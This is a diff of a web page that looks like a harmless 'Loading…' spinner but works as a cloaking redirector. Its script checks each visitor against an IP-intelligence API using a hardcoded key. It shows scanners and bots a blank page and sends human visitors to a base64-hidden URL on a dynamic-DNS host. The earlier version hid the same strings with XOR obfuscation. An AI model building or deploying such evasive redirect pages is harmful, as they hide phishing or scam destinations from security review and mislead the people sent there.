@@ -2,75 +2,111 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Loading…</title>
+
 <style>
-  :root{--bg:#fff;--txt:#222}
-  @media (prefers-color-scheme: dark){:root{--bg:#0e0e0e;--txt:#f2f2f2}}
-  html,body{height:100%;margin:0;background:var(--bg);color:var(--txt);font-family:Arial,Segoe UI,Inter}
-  #wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;opacity:0;transition:.25s;z-index:9999}
-  .sp{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,.08);border-top:6px solid #ff3b30;animation:spin 1s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .t{margin-top:12px;font-size:15px}
+  :root {
+    --bg: #ffffff;
+    --txt: #222222;
+    --spin-bg: rgba(0,0,0,0.1);
+    --spin-color: #ff3b30;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0e0e0e;
+      --txt: #f2f2f2;
+      --spin-bg: rgba(255,255,255,0.1);
+      --spin-color: #ff453a;
+    }
+  }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background: var(--bg);
+    color: var(--txt);
+    font-family: Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+  }
+
+  /* Responsive Spinner */
+  #spinner {
+    width: min(22vw, 70px);
+    height: min(22vw, 70px);
+    border-radius: 50%;
+    border: 6px solid var(--spin-bg);
+    border-top: 6px solid var(--spin-color);
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  #msg {
+    margin-top: 14px;
+    font-size: clamp(14px, 3vw, 18px);
+    color: var(--txt);
+  }
 </style>
+
 </head>
 <body>
 
-<div id="wrap">
-  <div class="sp"></div>
-  <div class="t">Loading…</div>
-</div>
+<div id="spinner"></div>
+<div id="msg">Loading…</div>
 
 <script>
-(function(){
+(async () => {
 
-  const KEY = 137;
 
-  const EU = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
-  const EA = "4/Hr7eCvr6jk7eTu6/Dg6uP07/H87f7l4+v37b3i6PXm7uGmwPbY7bmmtNf/8OQ=";
-  const EK = "4e/o6uXrreLw6+Li5vHb5eP86f/o7eP47vDu4vXv6PLh6ebkz+Hu7PyGuQ==";
+  const API_KEY = "9516c3e4-5fac-44cd-b3da-2007fd0918fb";
 
-  function b(a){a=atob(a);let u=new Uint8Array(a.length);for(let i=0;i<a.length;i++)u[i]=a.charCodeAt(i);return u;}
-  function x(u){let o=new Uint8Array(u.length);for(let i=0;i<u.length;i++)o[i]=u[i]^KEY;return o;}
-  function s(u){try{return new TextDecoder().decode(u);}catch(e){let z="";for(let i=0;i<u.length;i++)z+=String.fromCharCode(u[i]);return decodeURIComponent(escape(z));}}
+  
+  const REDIRECT_B64 = "aHR0cHM6Ly9tZWppa3VoaWJpbml1LmdsZWV6ZS5jb20vZ28vNTNiZDA1MmY=";
 
-  const w=document.getElementById("wrap");
-  function show(){w.style.opacity=1;}
+  
+  const TARGET_URL = atob(REDIRECT_B64);
 
-  async function run(){
+  try {
+    const res = await fetch("https://api.ipdetective.io/ip?info=true", {
+      method: "GET",
+      headers: {
+        "x-api-key": API_KEY,
+        "Accept": "application/json"
+      },
+      cache: "no-store"
+    });
 
-    const API=s(x(b(EA)));
-    const K=s(x(b(EK)));
+    if (!res.ok) {
+      document.body.innerHTML = "";
+      return;
+    }
 
-    let d=null;
+    const data = await res.json().catch(() => null);
+    if (!data) {
+      document.body.innerHTML = "";
+      return;
+    }
 
-    try{
-      const r=await fetch(API,{
-        headers:{
-          "x-api-key":K,
-          "Accept":"application/json",
-          "X-R":Math.random().toString(36).slice(2)
-        },
-        cache:"no-store",
-        method:"GET"
-      });
+    /* Jika bot → tetap blank */
+    if (data.bot === true) {
+      document.body.innerHTML = "";
+      return;
+    }
 
-      if(!r.ok)return;
-      d=await r.json().catch(()=>null);
-      if(!d)return;
+    /* Manusia → redirect */
+    window.location.replace(TARGET_URL);
 
-    }catch(e){return;}
-
-    if(d.bot===true)return;
-
-    show();
-    await new Promise(r=>setTimeout(r,400+Math.random()*400));
-
-    const U=s(x(b(EU)));
-    if(U.startsWith("http"))location.replace(U);
+  } catch (e) {
+    document.body.innerHTML = "";
   }
-
-  run();
 
 })();
 </script>
